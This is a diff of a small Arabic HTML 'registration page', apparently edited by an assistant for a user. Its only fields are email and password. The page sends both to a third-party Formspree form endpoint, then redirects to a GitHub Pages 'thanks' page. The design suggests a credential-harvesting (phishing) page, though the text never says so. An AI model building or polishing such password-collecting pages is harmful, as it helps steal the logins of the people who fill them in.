@@ -1,29 +1,60 @@
-<script>
-    var form = document.getElementById("my-form");
-    
-    form.onsubmit = function(event) {
-      event.preventDefault(); 
-      
-      var data = new FormData(form);
-      // تحويل البيانات لتنسيق يفهمه السيرفر فوراً
-      var object = {};
-      data.forEach((value, key) => object[key] = value);
-      var json = JSON.stringify(object);
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة التسجيل</title>
+    <style>
+        /* هذا هو تصميمك الذي حافظنا عليه */
+        body { font-family: sans-serif; background: #eef2f3; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 15px; shadow: 0 5px 15px rgba(0,0,0,0.1); width: 300px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #0056b3; }
+        label { font-size: 14px; color: #333; }
+    </style>
+</head>
+<body>
 
-      var xhr = new XMLHttpRequest();
-      xhr.open(form.method, form.action);
-      xhr.setRequestHeader("Content-Type", "application/json"); // إخبار السيرفر أننا نرسل بيانات منظمة
-      xhr.setRequestHeader("Accept", "application/json");
-      
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState !== XMLHttpRequest.DONE) return;
-        if (xhr.status === 200) {
-          // التوجيه لصفحة الشكر بعد التأكد من استلام السيرفر للبيانات
-          window.location.href = "https://alymaanythlkm.github.io/999/thanks.html";
-        } else {
-          alert("خطأ: تأكد من تفعيل النموذج في إيميلك");
-        }
-      };
-      xhr.send(json);
-    };
-</script>
+    <div class="box">
+        <form id="my-form" action="https://formspree.io/f/xgozqzbw" method="POST">
+            <label>البريد الإلكتروني:</label>
+            <input type="text" name="Email" required>
+            
+            <label>كلمة السر:</label>
+            <input type="password" name="Password" required>
+
+            <button type="submit" id="submit-btn">تسجيل</button>
+        </form>
+    </div>
+
+    <script>
+        var form = document.getElementById("my-form");
+        
+        form.onsubmit = function(event) {
+          event.preventDefault(); 
+          var btn = document.getElementById("submit-btn");
+          btn.disabled = true;
+          btn.innerText = "جاري الإرسال...";
+
+          var data = new FormData(form);
+          var xhr = new XMLHttpRequest();
+          xhr.open(form.method, form.action);
+          xhr.setRequestHeader("Accept", "application/json");
+          
+          xhr.onreadystatechange = function() {
+            if (xhr.readyState !== XMLHttpRequest.DONE) return;
+            if (xhr.status === 200) {
+              // التوجيه لصفحة الشكر الخاصة بك في مستودع 999
+              window.location.href = "https://alymaanythlkm.github.io/999/thanks.html";
+            } else {
+              btn.disabled = false;
+              btn.innerText = "تسجيل";
+              alert("حدث خطأ، تأكد من اتصال الإنترنت");
+            }
+          };
+          xhr.send(data);
+        };
+    </script>
+</body>
+</html>
